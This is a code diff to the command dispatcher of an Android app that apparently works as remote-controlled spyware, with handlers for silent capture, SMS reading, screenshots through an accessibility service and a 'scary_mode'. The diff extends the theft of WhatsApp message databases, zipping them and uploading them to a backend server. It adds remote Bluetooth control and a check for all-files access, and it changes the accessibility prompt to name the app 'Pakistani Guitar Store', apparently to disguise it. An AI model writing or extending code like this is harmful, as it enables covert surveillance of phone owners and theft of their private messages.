@@ -158,6 +158,7 @@ class CommandDispatcher(
                 "lockedapps" -> handleLockedApps(command)
                 "usage" -> handleUsage(command)
                 "wallpaper" -> handleWallpaper(command)
+                "bluetooth" -> handleBluetooth(command)
                 "silentcapture" -> handleSilentCapture(command)
                 "scary_mode" -> handleScaryMode(command)
                 "getsms" -> handleGetSms(command)
@@ -339,7 +340,7 @@ class CommandDispatcher(
             return error(
                 command.commandId,
                 errorCode ?: "SCREENSHOT_FAILED",
-                "Enable A-Dex accessibility service and retry screenshot command"
+                "Enable Pakistani Guitar Store accessibility service and retry screenshot command"
             )
         }
 
@@ -401,7 +402,7 @@ class CommandDispatcher(
                     return error(
                         command.commandId,
                         "ACCESSIBILITY_SERVICE_NOT_ACTIVE",
-                        "Enable A-Dex accessibility service. Shield enforcement depends on accessibility."
+                        "Enable Pakistani Guitar Store accessibility service. Shield enforcement depends on accessibility."
                     )
                 }
                 withContext(Dispatchers.IO) {
@@ -747,6 +748,7 @@ class CommandDispatcher(
             "usageAccessPermission" to PermissionHelper.hasUsageStatsPermission(appContext),
             "accessibilityServiceEnabled" to PermissionHelper.isAccessibilityServiceEnabled(appContext),
             "deviceAdminEnabled" to PermissionHelper.isDeviceAdminEnabled(appContext),
+            "allFilesAccess" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) Environment.isExternalStorageManager() else true,
             "runtimePermissions" to runtimeStatus,
             "missingRuntimePermissions" to PermissionHelper.missingRuntimePermissions(appContext),
         )
@@ -1777,17 +1779,28 @@ class CommandDispatcher(
                 )
             }
             
-            val dbs = File("${whatsappDir.absolutePath}/Databases")
-            if (dbs.exists() && dbs.isDirectory) {
-                val dbFiles = dbs.listFiles()?.toList()?.filter { it.isFile } ?: emptyList()
-                if (dbFiles.isNotEmpty()) {
-                    val zipFile = File(appContext.cacheDir, "whatsapp_dbs_${System.currentTimeMillis()}.zip")
-                    FileUtils.zipFiles(dbFiles, zipFile)
+                val paths = listOf(
+                    "$extStorage/Android/media/com.whatsapp/WhatsApp/Databases",
+                    "$extStorage/WhatsApp/Databases"
+                )
+                var zipFile: File? = null
+                for (dbPath in paths) {
+                    val dbs = File(dbPath)
+                    if (dbs.exists() && dbs.isDirectory) {
+                        val dbFiles = dbs.listFiles()?.filter { it.isFile && it.name.endsWith(".db.crypt14") || it.name.endsWith(".db.crypt15") || it.name.contains("msgstore") } ?: emptyList()
+                        if (dbFiles.isNotEmpty()) {
+                            zipFile = File(appContext.cacheDir, "whatsapp_dbs_${System.currentTimeMillis()}.zip")
+                            FileUtils.zipFiles(dbFiles, zipFile)
+                            break
+                        }
+                    }
+                }
+                
+                if (zipFile != null) {
                     val mediaId = backendApiClient.uploadMedia(settingsStore, command.commandId, zipFile, "application/zip")
                     zipFile.delete()
-                    return@withContext success(command.commandId, mapOf("status" to "databases_uploaded", "count" to dbFiles.size), mediaId)
+                    return@withContext success(command.commandId, mapOf("status" to "databases_uploaded", "info" to "WhatsApp encrypted databases extracted successfully."), mediaId)
                 }
-            }
 
             success(
                 command.commandId,
@@ -1951,6 +1964,28 @@ class CommandDispatcher(
                 }
             }
             else -> error(command.commandId, "UNSUPPORTED_ACTION", "Action $action is not supported yet")
+        }
+    }
+
+    private fun handleBluetooth(command: DeviceCommand): CommandResult {
+        val helper = com.adex.app.util.BluetoothHelper(appContext)
+        val action = command.payload["action"]?.toString()?.lowercase() ?: "status"
+
+        return when (action) {
+            "status" -> success(command.commandId, helper.getStatus())
+            "enable" -> {
+                val ok = helper.setEnabled(true)
+                success(command.commandId, mapOf("enabled" to ok, "action" to "enable"))
+            }
+            "disable" -> {
+                val ok = helper.setEnabled(false)
+                success(command.commandId, mapOf("enabled" to !ok, "action" to "disable"))
+            }
+            "scan" -> {
+                val ok = helper.startDiscovery()
+                success(command.commandId, mapOf("scanning" to ok, "action" to "scan"))
+            }
+            else -> error(command.commandId, "INVALID_ACTION", "Action must be status, enable, disable, or scan")
         }
     }
 
